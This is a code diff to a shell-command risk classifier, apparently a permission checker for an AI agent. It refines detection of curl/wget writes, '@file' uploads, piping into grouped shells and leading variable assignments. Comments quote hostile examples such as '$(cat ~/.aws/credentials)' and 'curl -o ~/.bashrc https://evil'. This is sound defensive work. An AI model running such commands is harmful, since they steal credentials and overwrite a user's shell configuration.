@@ -788,7 +788,7 @@ const CONSUMER_WRITE_FLAGS: Record<string, RegExp> = {
 	// Anchored at `-` and then scanning the BUNDLE, not at `-o`: `sort -uo f`
 	// and `sort -ro f` write just as `sort -o f` does.
 	sort: /^--output|^-[a-zA-Z]*o/u,
-	yq: /^--inplace|^-[a-zA-Z]*i/u,
+	yq: /^--inplace|^--split-exp|^-[a-zA-Z]*[is]/u,
 	jq: /^(--rawfile|--slurpfile)/u,
 };
 
@@ -817,7 +817,7 @@ const CURL_READ_ONLY_FLAGS = new Set([
  */
 const WGET_VALUE_TAKING_FLAGS = new Set([
 	"--timeout", "--connect-timeout", "--read-timeout", "--tries", "--user-agent",
-	"--header", "--max-redirect", "--method", "--body-data",
+	"--header", "--max-redirect", "--method", "--body-data", "--compression",
 ]);
 
 /** wget flags that cannot name a local path. Anything not here disqualifies. */
@@ -886,8 +886,24 @@ function stdinExecutingInterpreters(stage: string): string[] {
 	// ONLY the first segment. A pipe feeds the command it precedes, not whatever
 	// follows a `;` or `||` inside the same stage: `curl … | jq . ; node` was
 	// reported as piping into node.
-	const segment = tokenizeShellSegments(stage)[0];
-	if (!segment || segment.length === 0) return [];
+	const stageSegments = tokenizeShellSegments(stage);
+	// Normally only the first command is stdin-fed — `jq . ; node` does not pipe
+	// into node. Inside a group the pipe feeds the WHOLE group, so
+	// `| (echo hi; sh)` and `| { echo hi; sh; }` do reach the shell.
+	// Tested on the raw stage: the tokenizer consumes `(` as a segment
+	// boundary so it never survives as a token, while `{` does.
+	const grouped = /^\s*[({]/u.test(stage);
+	const candidates = grouped ? stageSegments : stageSegments.slice(0, 1);
+	const found: string[] = [];
+	for (const segment of candidates) {
+		if (segment.length === 0) continue;
+		const verbs = interpretersInSegment(segment);
+		for (const v of verbs) if (!found.includes(v)) found.push(v);
+	}
+	return found;
+}
+
+function interpretersInSegment(segment: string[]): string[] {
 
 	let i = 0;
 	let sawWrapper = false;
@@ -1002,7 +1018,7 @@ function isPlainReadOnlyFetch(command: string): boolean {
 	// this comment claimed the substitution span scan covered it. That scan only
 	// looks for MODERATE_RISK_TOKENS, so `$(cat ~/.aws/credentials)` walked
 	// past it — `cat` is not a risk token.)
-	if (/[<>@]/u.test(command)) return false;
+	if (/[<>]/u.test(command)) return false;
 	// Command substitution EXECUTES. Tested on the raw command, because relying
 	// on the tokenizer treating `(` as a boundary is an accident that does not
 	// hold inside double quotes and never held for backticks: `curl -s
@@ -1030,24 +1046,30 @@ function isPlainReadOnlyFetch(command: string): boolean {
 			// Decided positionally inside the loop, never by scanning the array:
 			// `wget --header --spider …` has --header consume --spider, so a
 			// whole-array includes() saw a marker the tool never applies.
-			let wgetStdout = verb === "curl";
+			let wgetStdout = fetch === "curl";
 			for (let k = 0; k < args.length; k++) {
 				const arg = args[k];
+				// `@file` names a local file to send. Tested per token, not over
+				// the whole command: `https://registry.npmjs.org/@babel/core` is
+				// an ordinary URL and scoped packages are common enough that
+				// banning `@` outright ate a visible slice of the prompt
+				// reduction this exists to deliver.
+				if (arg.startsWith("@") || arg.includes("=@")) return false;
 				if (!arg.startsWith("-") || arg === "-") continue;
 				// wget writes a file unless stdout is explicit; curl is the reverse.
 				// `-O` must stand alone. In a bundle, getopt hands the trailing
 				// `O-` to the FIRST value-taking flag in the prefix, so `-oO-`
 				// is `-o O-` (a log file) and `-O` never applies. Honoring the
 				// bundle let `wget -PO-` clear while downloading to ./O-/.
-				if (verb === "wget" && arg === "--spider") {
+				if (fetch === "wget" && arg === "--spider") {
 					wgetStdout = true;
 					continue;
 				}
-				if (verb === "wget" && (bundleIsWgetStdout(arg) || arg === "--output-document=-")) {
+				if (fetch === "wget" && (bundleIsWgetStdout(arg) || arg === "--output-document=-")) {
 					wgetStdout = true;
 					continue;
 				}
-				if (verb === "wget" && (bundleIsWgetStdoutSplit(arg, args[k + 1]) || arg === "--output-document")) {
+				if (fetch === "wget" && (bundleIsWgetStdoutSplit(arg, args[k + 1]) || arg === "--output-document")) {
 					if (args[k + 1] !== "-") return false;
 					wgetStdout = true;
 					k++;
@@ -1058,7 +1080,7 @@ function isPlainReadOnlyFetch(command: string): boolean {
 					if (!allowed.has(flag)) return false;
 				}
 				// Skip a consumed value so it cannot pose as a flag next pass.
-				if (verb === "wget" && WGET_VALUE_TAKING_FLAGS.has(base) && !arg.includes("=")) k++;
+				if (fetch === "wget" && WGET_VALUE_TAKING_FLAGS.has(base) && !arg.includes("=")) k++;
 			}
 			if (!wgetStdout) return false;
 			continue;
@@ -1117,7 +1139,16 @@ export function matchModerateRiskTokens(command: string): string[] {
 		return false;
 	};
 
-	for (const segment of segments) {
+	for (const rawSegment of segments) {
+		if (rawSegment.length === 0) continue;
+		// `FOO=1 curl -o ~/.bashrc https://evil` put the assignment in words[0],
+		// so the verb was never examined and nothing flagged. The pipe side
+		// already skipped assignments; the segment loop did not.
+		let assignments = 0;
+		while (assignments < rawSegment.length && /^[a-z_][a-z0-9_]*=/iu.test(rawSegment[assignments])) {
+			assignments++;
+		}
+		const segment = assignments > 0 ? rawSegment.slice(assignments) : rawSegment;
 		if (segment.length === 0) continue;
 		const words = segment.map(w => w.toLowerCase());
 
